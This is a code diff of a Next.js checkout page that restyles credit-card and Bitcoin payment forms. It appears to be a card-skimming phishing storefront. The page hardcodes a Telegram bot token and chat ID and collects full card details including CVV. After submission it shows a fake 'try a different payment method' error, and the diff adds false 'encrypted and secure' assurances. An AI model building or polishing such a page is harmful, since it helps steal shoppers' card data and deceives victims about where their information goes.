@@ -1,10 +1,10 @@
 'use client'
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import Link from 'next/link';
 import { useCart } from '@/context/CartContext';
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check } from 'lucide-react';
+import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check, Shield, Lock, Star, Truck, RefreshCw } from 'lucide-react';
 
 const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
 const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7860277201';
@@ -18,31 +18,46 @@ const PaymentMethodCard = ({
   title, 
   description, 
   isSelected, 
-  onClick 
+  onClick,
+  badge
 }: {
   icon: React.ReactNode;
   title: string;
   description: string;
   isSelected: boolean;
   onClick: () => void;
+  badge?: string;
 }) => (
   <div
     onClick={onClick}
-    className={`p-4 rounded-xl border-2 cursor-pointer transition-all ${isSelected ? 'border-blue-500 bg-blue-50 shadow-sm' : 'border-gray-200 hover:border-gray-300'}`}
+    className={`group relative p-5 rounded-2xl border-2 cursor-pointer transition-all duration-300 transform hover:scale-[1.02] ${
+      isSelected 
+        ? 'border-blue-500 bg-gradient-to-r from-blue-50 to-indigo-50 shadow-lg shadow-blue-100' 
+        : 'border-gray-200 hover:border-gray-300 hover:shadow-md bg-white'
+    }`}
   >
+    {badge && (
+      <div className="absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded-full font-medium">
+        {badge}
+      </div>
+    )}
     <div className="flex items-center space-x-4">
-      <div className={`p-3 rounded-lg ${isSelected ? 'bg-blue-100 text-blue-600' : 'bg-gray-100 text-gray-600'}`}>
+      <div className={`p-3 rounded-xl transition-all duration-300 ${
+        isSelected 
+          ? 'bg-blue-100 text-blue-600 shadow-md' 
+          : 'bg-gray-100 text-gray-600 group-hover:bg-gray-200'
+      }`}>
         {icon}
       </div>
-      <div>
-        <h3 className="font-medium text-gray-900">{title}</h3>
-        <p className="text-sm text-gray-500">{description}</p>
+      <div className="flex-1">
+        <h3 className="font-semibold text-gray-900 text-lg">{title}</h3>
+        <p className="text-sm text-gray-500 mt-1">{description}</p>
       </div>
-      {isSelected && (
-        <div className="ml-auto bg-blue-500 rounded-full p-1">
-          <Check className="h-3 w-3 text-white" />
+      <div className={`transition-all duration-300 ${isSelected ? 'scale-100 opacity-100' : 'scale-0 opacity-0'}`}>
+        <div className="bg-blue-500 rounded-full p-1.5 shadow-md">
+          <Check className="h-4 w-4 text-white" />
         </div>
-      )}
+      </div>
     </div>
   </div>
 );
@@ -58,6 +73,7 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
   });
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const [focusedField, setFocusedField] = useState<string | null>(null);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -124,97 +140,134 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
   };
 
   return (
-    <div className="space-y-4">
-      <div className="space-y-4">
-        <InputField
-          label="Full Name *"
-          id="name"
-          name="name"
-          value={formData.name}
-          onChange={handleChange}
-          required
-          placeholder="Your name"
-        />
+    <div className="space-y-6">
+      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 p-4 rounded-xl border border-orange-200">
+        <div className="flex items-center space-x-3">
+          <Bitcoin className="h-6 w-6 text-orange-500" />
+          <div>
+            <h4 className="font-semibold text-orange-900">Secure Bitcoin Payment</h4>
+            <p className="text-sm text-orange-700">Fast, secure, and decentralized payment processing</p>
+          </div>
+        </div>
+      </div>
 
-        <InputField
-          label="Email Address *"
-          id="email"
-          name="email"
-          type="email"
-          value={formData.email}
-          onChange={handleChange}
-          required
-          placeholder="your@email.com"
-        />
+      <div className="space-y-5">
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <InputField
+            label="Full Name"
+           
+            name="name"
+            value={formData.name}
+            onChange={handleChange}
+            required
+            placeholder="Enter your full name"
+          
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
 
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <InputField
+            label="Email Address"
+           
+            name="email"
+            type="email"
+            value={formData.email}
+            onChange={handleChange}
+            required
+            placeholder="your@email.com"
+           
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
           <InputField
             label="Country"
-            id="country"
+            
             name="country"
             value={formData.country}
             onChange={handleChange}
             placeholder="United States"
+            
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
           />
 
           <InputField
             label="ZIP/Postal Code"
-            id="zipCode"
+           
             name="zipCode"
             value={formData.zipCode}
             onChange={handleChange}
             placeholder="10001"
+            icon="📮"
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
           />
         </div>
 
         <InputField
           label="Street Address"
-          id="address"
+          
           name="address"
           value={formData.address}
           onChange={handleChange}
-          placeholder="123 Main St"
+          placeholder="123 Main Street"
+          
+          focusedField={focusedField}
+          setFocusedField={setFocusedField}
         />
 
         <InputField
           label="City"
-          id="city"
+        
           name="city"
           value={formData.city}
           onChange={handleChange}
           placeholder="New York"
+          
+          focusedField={focusedField}
+          setFocusedField={setFocusedField}
         />
       </div>
 
       <button
         onClick={handlePayment}
         disabled={loading}
-        className={`w-full py-3 px-6 rounded-lg font-medium text-white transition-colors flex items-center justify-center ${
+        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
           loading
             ? 'bg-gray-400 cursor-not-allowed'
-            : 'bg-[#f7931a] hover:bg-[#e08119] shadow-md'
+            : 'bg-gradient-to-r from-orange-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 shadow-orange-200 hover:shadow-xl'
         }`}
       >
         {loading ? (
           <>
-            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-            Processing...
+            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
+            Processing Payment...
           </>
         ) : (
           <>
-            <Bitcoin className="w-5 h-5 mr-2" />
+            <Bitcoin className="w-5 h-5 mr-3" />
             Pay ${totalAmount.toFixed(2)} with Bitcoin
+            <Shield className="w-4 h-4 ml-2 opacity-80" />
           </>
         )}
       </button>
 
       {error && (
-        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-lg">
-          <p className="font-medium">Payment Error</p>
-          <p>{error}</p>
+        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-xl animate-pulse">
+          <div className="flex items-center">
+            <div className="flex-shrink-0">
+              <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+              </svg>
+            </div>
+            <div className="ml-3">
+              <p className="font-medium">Payment Error</p>
+              <p className="text-sm">{error}</p>
+            </div>
+          </div>
         </div>
       )}
     </div>
@@ -238,6 +291,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [status, setStatus] = useState({ message: '', color: '' });
   const [loading, setLoading] = useState(false);
+  const [focusedField, setFocusedField] = useState<string | null>(null);
 
   const luhnCheck = (num: string): boolean => {
     const arr = num.split('').reverse().map(x => parseInt(x, 10));
@@ -271,6 +325,14 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
       return digits.substring(0, 2) + '/' + digits.substring(2);
     }
     return digits;
+  };
+
+  const getCardType = (number: string): string => {
+    const num = number.replace(/\s/g, '');
+    if (num.startsWith('4')) return 'visa';
+    if (num.startsWith('5') || num.startsWith('2')) return 'mastercard';
+    if (num.startsWith('3')) return 'amex';
+    return 'card';
   };
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -366,7 +428,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
       }
 
       setStatus({
-        message: 'Opps! Please try Different Payment Method',
+        message: 'Oops! Please try a different payment method',
         color: 'red'
       });
       setForm({
@@ -394,174 +456,223 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-4">
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-        <div className="md:col-span-2">
-          <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
+    <form onSubmit={handleSubmit} className="space-y-6">
+      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 rounded-xl border border-blue-200">
+        <div className="flex items-center space-x-3">
+          <Shield className="h-6 w-6 text-blue-500" />
+          <div>
+            <h4 className="font-semibold text-teal-900">Secure Payment</h4>
+            <p className="text-sm text-teal-700">Your payment information is encrypted and secure</p>
+          </div>
+        </div>
+      </div>
+
+      <div className="space-y-5">
+        <div className="relative">
+          <label className="block text-sm font-semibold text-gray-700 mb-2">Name on Card</label>
           <input
             type="text"
             name="cardName"
-            placeholder="Your Name here"
+            placeholder=""
             value={form.cardName}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.cardName ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            onFocus={() => setFocusedField('cardName')}
+            onBlur={() => setFocusedField(null)}
+            className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
+              errors.cardName 
+                ? 'border-red-500 bg-red-50' 
+                : focusedField === 'cardName'
+                ? 'border-teal-500 bg-blue-50 shadow-lg shadow-blue-100'
+                : 'border-gray-200 hover:border-gray-300'
+            } focus:outline-none text-gray-900 placeholder-gray-400`}
             disabled={loading}
           />
-          {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
+          {errors.cardName && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cardName}</p>}
         </div>
 
-        <div className="md:col-span-2">
-          <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
-          <input
-            type="text"
-            name="cardNumber"
-            placeholder="1234 5678 9012 3456"
-            value={form.cardNumber}
-            onChange={handleChange}
-            maxLength={19}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.cardNumber ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
-          />
-          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
+        <div className="relative">
+          <label className="block text-sm font-semibold text-gray-700 mb-2">Card Number</label>
+          <div className="relative">
+            <input
+              type="text"
+              name="cardNumber"
+              placeholder="1234 5678 9012 3456"
+              value={form.cardNumber}
+              onChange={handleChange}
+              onFocus={() => setFocusedField('cardNumber')}
+              onBlur={() => setFocusedField(null)}
+              maxLength={19}
+              className={`w-full px-4 py-4 pr-12 rounded-xl border-2 transition-all duration-300 ${
+                errors.cardNumber 
+                  ? 'border-red-500 bg-red-50' 
+                  : focusedField === 'cardNumber'
+                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
+                  : 'border-gray-200 hover:border-gray-300'
+              } focus:outline-none text-gray-900 placeholder-gray-400`}
+              disabled={loading}
+            />
+            <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+              <CreditCard className={`h-6 w-6 ${getCardType(form.cardNumber) === 'visa' ? 'text-blue-600' : 'text-gray-400'}`} />
+            </div>
+          </div>
+          {errors.cardNumber && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cardNumber}</p>}
         </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
-          <input
-            type="text"
-            name="expiry"
-            placeholder="MM/YY"
-            value={form.expiry}
-            onChange={handleChange}
-            maxLength={5}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.expiry ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
-          />
-          {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
+        <div className="grid grid-cols-2 gap-5">
+          <div className="relative">
+            <label className="block text-sm font-semibold text-gray-700 mb-2">Expiry Date</label>
+            <input
+              type="text"
+              name="expiry"
+              placeholder="MM/YY"
+              value={form.expiry}
+              onChange={handleChange}
+              onFocus={() => setFocusedField('expiry')}
+              onBlur={() => setFocusedField(null)}
+              maxLength={5}
+              className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
+                errors.expiry 
+                  ? 'border-red-500 bg-red-50' 
+                  : focusedField === 'expiry'
+                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
+                  : 'border-gray-200 hover:border-gray-300'
+              } focus:outline-none text-gray-900 placeholder-gray-400`}
+              disabled={loading}
+            />
+            {errors.expiry && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.expiry}</p>}
+          </div>
+
+          <div className="relative">
+            <label className="block text-sm font-semibold text-gray-700 mb-2">CVV</label>
+            <div className="relative">
+              <input
+                type="text"
+                name="cvv"
+                placeholder="123"
+                value={form.cvv}
+                onChange={handleChange}
+                onFocus={() => setFocusedField('cvv')}
+                onBlur={() => setFocusedField(null)}
+                maxLength={4}
+                className={`w-full px-4 py-4 pr-10 rounded-xl border-2 transition-all duration-300 ${
+                  errors.cvv 
+                    ? 'border-red-500 bg-red-50' 
+                    : focusedField === 'cvv'
+                    ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
+                    : 'border-gray-200 hover:border-gray-300'
+                } focus:outline-none text-gray-900 placeholder-gray-400`}
+                disabled={loading}
+              />
+              <Lock className="absolute right-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
+            </div>
+            {errors.cvv && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cvv}</p>}
+          </div>
         </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
-          <input
-            type="text"
-            name="cvv"
-            placeholder="123"
-            value={form.cvv}
-            onChange={handleChange}
-            maxLength={4}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.cvv ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
-          />
-          {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
-        </div>
-
-        <div className="md:col-span-2">
-          <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
-          <input
-            type="email"
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <InputField
+            label="Email Address"
             name="email"
+            type="email"
             placeholder="your@email.com"
             value={form.email}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
+            error={errors.email}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            
           />
-          {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
-        </div>
 
-        <div className="md:col-span-2">
-          <label className="block text-sm font-medium text-gray-700 mb-1">Address</label>
-          <input
-            type="text"
-            name="address"
-            placeholder="123 Main St"
-            value={form.address}
+          <InputField
+            label="Phone Number"
+            name="phone"
+            type="tel"
+            placeholder="+1 (555) 123-4567"
+            value={form.phone}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.address ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
+            error={errors.phone}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            
           />
-          {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
         </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
-          <input
-            type="text"
+        <InputField
+          label="Street Address"
+          name="address"
+          placeholder="123 Main Street"
+          value={form.address}
+          onChange={handleChange}
+          error={errors.address}
+          focusedField={focusedField}
+          setFocusedField={setFocusedField}
+          
+        />
+
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
+          <InputField
+            label="City"
             name="city"
             placeholder="New York"
             value={form.city}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.city ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
+            error={errors.city}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            
           />
-          {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
-        </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">Country</label>
-          <input
-            type="text"
+          <InputField
+            label="Country"
             name="country"
             placeholder="United States"
             value={form.country}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.country ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
+            error={errors.country}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            
           />
-          {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
-        </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
-          <input
-            type="text"
+          <InputField
+            label="ZIP Code"
             name="zipCode"
             placeholder="10001"
             value={form.zipCode}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.zipCode ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
+            error={errors.zipCode}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            
           />
-          {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
-        </div>
-
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
-          <input
-            type="tel"
-            name="phone"
-            placeholder="+1 (555) 123-4567"
-            value={form.phone}
-            onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border ${errors.phone ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
-            disabled={loading}
-          />
-          {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
         </div>
       </div>
 
       <button
         type="submit"
         disabled={loading}
-        className={`w-full py-3 px-4 rounded-lg font-bold text-white transition-all flex items-center justify-center ${
-          loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700 shadow-md'
+        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
+          loading 
+            ? 'bg-gray-400 cursor-not-allowed' 
+            : 'bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 shadow-blue-200 hover:shadow-xl'
         }`}
       >
         {loading ? (
           <>
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
-            Processing...
+            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
+            Processing Payment...
           </>
         ) : (
           <>
-            <CreditCard className="w-5 h-5 mr-2" />
+            <CreditCard className="w-5 h-5 mr-3" />
             Pay ${totalAmount.toFixed(2)}
+            <Shield className="w-4 h-4 ml-2 opacity-80" />
           </>
         )}
       </button>
 
       {status.message && (
-        <div className={`p-3 rounded-lg text-center font-medium ${
+        <div className={`p-4 rounded-xl text-center font-medium transition-all duration-300 ${
           status.color === 'green' 
             ? 'bg-green-50 text-green-700 border border-green-200' 
             : 'bg-red-50 text-red-700 border border-red-200'
@@ -575,37 +686,58 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
 
 const InputField = ({
   label,
-  id,
   name,
   type = 'text',
   value,
   onChange,
-  required = false,
-  placeholder = ''
+  placeholder = '',
+  error,
+  focusedField,
+  setFocusedField,
+  icon,
+  required = false
 }: {
   label: string;
-  id: string;
   name: string;
   type?: string;
   value: string;
   onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
-  required?: boolean;
   placeholder?: string;
+  error?: string;
+  focusedField?: string | null;
+  setFocusedField?: (field: string | null) => void;
+  icon?: string;
+  required?: boolean;
 }) => (
-  <div>
-    <label htmlFor={id} className="block text-sm font-medium text-gray-700 mb-1">
-      {label}
+  <div className="relative">
+    <label className="block text-sm font-semibold text-gray-700 mb-2">
+      {label} {required && <span className="text-red-500">*</span>}
     </label>
-    <input
-      type={type}
-      id={id}
-      name={name}
-      required={required}
-      value={value}
-      onChange={onChange}
-      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900"
-      placeholder={placeholder}
-    />
+    <div className="relative">
+      <input
+        type={type}
+        name={name}
+        required={required}
+        value={value}
+        onChange={onChange}
+        onFocus={() => setFocusedField?.(name)}
+        onBlur={() => setFocusedField?.(null)}
+        className={`w-full px-4 py-4 ${icon ? 'pl-12' : ''} rounded-xl border-2 transition-all duration-300 ${
+          error 
+            ? 'border-red-500 bg-red-50' 
+            : focusedField === name
+            ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
+            : 'border-gray-200 hover:border-gray-300'
+        } focus:outline-none text-gray-900 placeholder-gray-400`}
+        placeholder={placeholder}
+      />
+      {icon && (
+        <span className="absolute left-4 top-1/2 transform -translate-y-1/2 text-lg">
+          {icon}
+        </span>
+      )}
+    </div>
+    {error && <p className="text-red-500 text-sm mt-2 animate-pulse">{error}</p>}
   </div>
 );
 
@@ -613,20 +745,32 @@ const CheckoutPage = () => {
   const { cart, getTotalPrice } = useCart();
   const [paymentMethod, setPaymentMethod] = useState<string>('credit-card');
   const [orderCompleted, setOrderCompleted] = useState(false);
+  const [isLoaded, setIsLoaded] = useState(false);
+
+  useEffect(() => {
+    setIsLoaded(true);
+  }, []);
 
   if (cart.length === 0 && !orderCompleted) {
     return (
-      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-white min-h-screen">
-        <div className="max-w-md mx-auto">
-          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-gray-900">Your Cart is Empty</h1>
-          <p className="mb-6 sm:mb-8 text-gray-600 text-sm sm:text-base">
-            Looks like you haven't added any products to your cart yet.
-          </p>
-          <Link href="/">
-            <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 sm:px-8 py-2 sm:py-3">
-              Continue Shopping
-            </Button>
-          </Link>
+      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-gradient-to-br from-gray-50 to-white min-h-screen">
+        <div className={`max-w-md mx-auto transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
+          <div className="bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
+            <div className="w-20 h-20 bg-gradient-to-r from-blue-100 to-indigo-100 rounded-full flex items-center justify-center mx-auto mb-6">
+              <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"></path>
+              </svg>
+            </div>
+            <h1 className="text-2xl sm:text-3xl font-bold mb-4 text-gray-900">Your Cart is Empty</h1>
+            <p className="mb-8 text-gray-600 text-base leading-relaxed">
+              Looks like you haven't added any products to your cart yet. Start shopping to find amazing deals!
+            </p>
+            <Link href="/">
+              <Button className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white px-8 py-4 rounded-2xl font-semibold transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl">
+                Start Shopping
+              </Button>
+            </Link>
+          </div>
         </div>
       </div>
     );
@@ -634,120 +778,164 @@ const CheckoutPage = () => {
 
   if (orderCompleted) {
     return (
-      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-white min-h-screen">
-        <div className="max-w-md mx-auto">
-          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
-            </svg>
+      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-gradient-to-br from-green-50 to-white min-h-screen">
+        <div className={`max-w-md mx-auto transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
+          <div className="bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
+            <div className="w-20 h-20 bg-gradient-to-r from-green-100 to-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
+              <Check className="w-10 h-10 text-green-600" />
+            </div>
+            <h1 className="text-2xl sm:text-3xl font-bold mb-4 text-gray-900">Order Received!</h1>
+            <p className="mb-8 text-gray-600 text-base leading-relaxed">
+              Thank you for your purchase. We've sent a confirmation to your email and will process your order shortly.
+            </p>
+            <Link href="/">
+              <Button className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white px-8 py-4 rounded-2xl font-semibold transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl">
+                Continue Shopping
+              </Button>
+            </Link>
           </div>
-          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-gray-900">Order Received!</h1>
-          <p className="mb-6 sm:mb-8 text-gray-600 text-sm sm:text-base">
-            Thank you for your purchase. We've sent a confirmation to your email.
-          </p>
-          <Link href="/">
-            <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 sm:px-8 py-2 sm:py-3">
-              Continue Shopping
-            </Button>
-          </Link>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="container mx-auto px-4 py-8 bg-white min-h-screen">
-      <div className="max-w-6xl mx-auto">
-        <div className="mb-6">
-          <Link href="/cart" className="text-blue-600 hover:text-blue-700 text-sm font-medium flex items-center">
-            <ArrowLeft className="w-4 h-4 mr-1" />
-            Back to Cart
-          </Link>
-        </div>
-
-        <h1 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-gray-900">Checkout</h1>
-
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-          <div className="lg:col-span-2 space-y-6">
-            <Card className="p-6 shadow-sm border border-gray-200 rounded-xl">
-              <h2 className="text-lg sm:text-xl font-bold mb-6 text-gray-900">Payment Method</h2>
-              
-              <div className="space-y-4 mb-6">
-                <PaymentMethodCard
-                  icon={<CreditCard className="h-5 w-5" />}
-                  title="Credit Card"
-                  description="Pay with Visa, Mastercard, etc."
-                  isSelected={paymentMethod === 'credit-card'}
-                  onClick={() => setPaymentMethod('credit-card')}
-                />
-                
-                <PaymentMethodCard
-                  icon={<Bitcoin className="h-5 w-5 text-[#f7931a]" />}
-                  title="Bitcoin"
-                  description="Pay with cryptocurrency"
-                  isSelected={paymentMethod === 'bitcoin'}
-                  onClick={() => setPaymentMethod('bitcoin')}
-                />
-              </div>
-
-              {paymentMethod === 'credit-card' ? (
-                <CreditCardPayment totalAmount={getTotalPrice() * 1.08} />
-              ) : (
-                <BitcoinPayment totalAmount={getTotalPrice() * 1.08} />
-              )}
-            </Card>
+    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50">
+      <div className="container mx-auto px-4 py-8">
+        <div className="max-w-7xl mx-auto">
+          <div className={`mb-8 transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
+            <Link href="/cart" className="inline-flex items-center text-blue-600 hover:text-blue-700 text-sm font-medium transition-colors duration-200 group">
+              <ArrowLeft className="w-4 h-4 mr-2 transition-transform duration-200 group-hover:-translate-x-1" />
+              Back to Cart
+            </Link>
           </div>
 
-          <div>
-            <Card className="p-6 shadow-sm border border-gray-200 rounded-xl sticky top-6">
-              <h2 className="text-lg sm:text-xl font-bold mb-6 text-gray-900">Order Summary</h2>
+          <div className={`mb-8 transition-all duration-700 delay-100 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
+            <h1 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-2">Secure Checkout</h1>
+            <p className="text-gray-600">Complete your purchase with confidence</p>
+          </div>
 
-              <div className="space-y-4 mb-6">
-                {cart.map(item => (
-                  <div key={item.id} className="flex justify-between items-start">
-                    <div className="flex items-start space-x-4">
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <div className={`lg:col-span-2 transition-all duration-700 delay-200 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
